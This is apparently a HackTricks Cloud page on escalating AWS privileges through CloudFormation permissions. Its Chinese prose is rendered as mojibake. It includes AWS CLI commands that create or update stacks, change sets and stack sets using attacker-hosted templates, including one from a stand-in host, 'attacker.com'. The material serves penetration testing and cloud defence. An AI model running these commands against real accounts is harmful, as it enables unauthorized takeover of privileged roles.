# AWS - äº‘å½¢æˆæƒé™æå‡

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## cloudformation

æœ‰å…³cloudformationçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

æ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰æ¨¡æ¿çš„CloudFormationå †æ ˆï¼ˆæ‰˜ç®¡åœ¨ä»–ä»¬çš„æœåŠ¡å™¨ä¸Šï¼‰ï¼Œä»¥**ä»¥æŒ‡å®šè§’è‰²çš„æƒé™æ‰§è¡Œæ“ä½œ**ï¼Œä»è€Œ**å‡çº§æƒé™**ã€‚
```bash
aws cloudformation create-stack --stack-name <stack-name> \
--template-url http://attacker.com/attackers.template \
--role-arn <arn-role>
```
åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å°†çœ‹åˆ°ä¸€ä¸ª**åˆ©ç”¨ç¤ºä¾‹**ï¼Œå…¶ä¸­åŒ…å«é¢å¤–æƒé™**`cloudformation:DescribeStacks`**ï¼š

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**æ½œåœ¨å½±å“ï¼š** ç‰¹å®šçš„äº‘å½¢æˆæœåŠ¡è§’è‰²æƒé™æå‡ã€‚

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥**æ»¥ç”¨ç°æœ‰çš„äº‘å½¢æˆå †æ ˆ**æ¥æ›´æ–°å®ƒï¼Œå¹¶åƒä¹‹å‰çš„æƒ…æ™¯ä¸€æ ·å‡çº§æƒé™ï¼š
```bash
aws cloudformation update-stack \
--stack-name privesc \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
--capabilities CAPABILITY_IAM \
--region eu-west-1
```
### `cloudformation:SetStackPolicy` | `cloudformation:UpdateStack`

å¯ä»¥ä½¿ç”¨`cloudformation:SetStackPolicy`æƒé™æ¥**ä¸ºè‡ªå·±æˆäºˆ`UpdateStack`æƒé™**ä»¥å¯¹å †æ ˆæ‰§è¡Œæ”»å‡»ã€‚

**æ½œåœ¨å½±å“ï¼š** ç‰¹æƒå‡çº§åˆ°æŒ‡å®šçš„cloudformationæœåŠ¡è§’è‰²ã€‚

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

å¦‚æœæ‚¨æ‹¥æœ‰æ­¤æƒé™ä½†**æ²¡æœ‰`iam:PassRole`**ï¼Œæ‚¨ä»ç„¶å¯ä»¥**æ›´æ–°ä½¿ç”¨çš„å †æ ˆ**å¹¶æ»¥ç”¨å®ƒä»¬å·²ç»é™„åŠ çš„**IAMè§’è‰²**ã€‚æŸ¥çœ‹å‰ä¸€èŠ‚çš„åˆ©ç”¨ç¤ºä¾‹ï¼ˆåªæ˜¯ä¸è¦åœ¨æ›´æ–°ä¸­æŒ‡å®šä»»ä½•è§’è‰²ï¼‰ã€‚

å¯ä»¥ä½¿ç”¨`cloudformation:SetStackPolicy`æƒé™æ¥**ä¸ºè‡ªå·±æˆäºˆ`UpdateStack`æƒé™**ä»¥å¯¹å †æ ˆæ‰§è¡Œæ”»å‡»ã€‚

**æ½œåœ¨å½±å“ï¼š** ç‰¹æƒå‡çº§åˆ°å·²é™„åŠ çš„cloudformationæœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

å…·æœ‰**ä¼ é€’è§’è‰²å’Œåˆ›å»º/æ‰§è¡ŒChangeSet**æƒé™çš„æ”»å‡»è€…å¯ä»¥åƒä½¿ç”¨CreateStackæˆ–UpdateStackä¸€æ ·**åˆ›å»º/æ›´æ–°æ–°çš„cloudformationå †æ ˆå¹¶æ»¥ç”¨cloudformationæœåŠ¡è§’è‰²**ã€‚

ä»¥ä¸‹åˆ©ç”¨æ˜¯**CreateStackçš„ä¸€ä¸ªå˜ä½“**ï¼Œä½¿ç”¨**ChangeSetæƒé™**æ¥åˆ›å»ºä¸€ä¸ªå †æ ˆã€‚
```bash
aws cloudformation create-change-set \
--stack-name privesc \
--change-set-name privesc \
--change-set-type CREATE \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::947247140022:role/CloudFormationAdmin \
--capabilities CAPABILITY_IAM \
--region eu-west-1

echo "Waiting 2 mins to change the stack"
sleep 120

aws cloudformation execute-change-set \
--change-set-name privesc \
--stack-name privesc \
--region eu-west-1

echo "Waiting 2 mins to execute the stack"
sleep 120

aws cloudformation describe-stacks \
--stack-name privesc \
--region eu-west-1
```
### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`

`cloudformation:SetStackPolicy`æƒé™å¯ç”¨äºåœ¨å †æ ˆä¸Š**æˆäºˆè‡ªå·±`ChangeSet`æƒé™**å¹¶æ‰§è¡Œæ”»å‡»ã€‚

**æ½œåœ¨å½±å“ï¼š** ç‰¹æƒå‡çº§åˆ°cloudformationæœåŠ¡è§’è‰²ã€‚

è¿™ç±»ä¼¼äºä¹‹å‰çš„æ–¹æ³•ï¼Œä½†ä¸æ¶‰åŠ**IAMè§’è‰²**ï¼Œå› æ­¤æ‚¨å¯ä»¥**æ»¥ç”¨å·²é™„åŠ çš„è§’è‰²**ï¼Œåªéœ€ä¿®æ”¹å‚æ•°ï¼š
```
--change-set-type UPDATE
```
**æ½œåœ¨å½±å“:** ç‰¹æƒå‡çº§è‡³å·²é™„åŠ çš„cloudformationæœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`,(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æƒé™åˆ›å»º/æ›´æ–°StackSetsï¼Œä»¥æ»¥ç”¨ä»»æ„çš„cloudformationè§’è‰²ã€‚

**æ½œåœ¨å½±å“:** ç‰¹æƒå‡çº§è‡³cloudformationæœåŠ¡è§’è‰²ã€‚

### `cloudformation:UpdateStackSet`

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤æƒé™ï¼Œæ— éœ€passRoleæƒé™å³å¯æ›´æ–°StackSetsï¼Œä»¥æ»¥ç”¨å·²é™„åŠ çš„cloudformationè§’è‰²ã€‚

**æ½œåœ¨å½±å“:** ç‰¹æƒå‡çº§è‡³å·²é™„åŠ çš„cloudformationè§’è‰²ã€‚

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
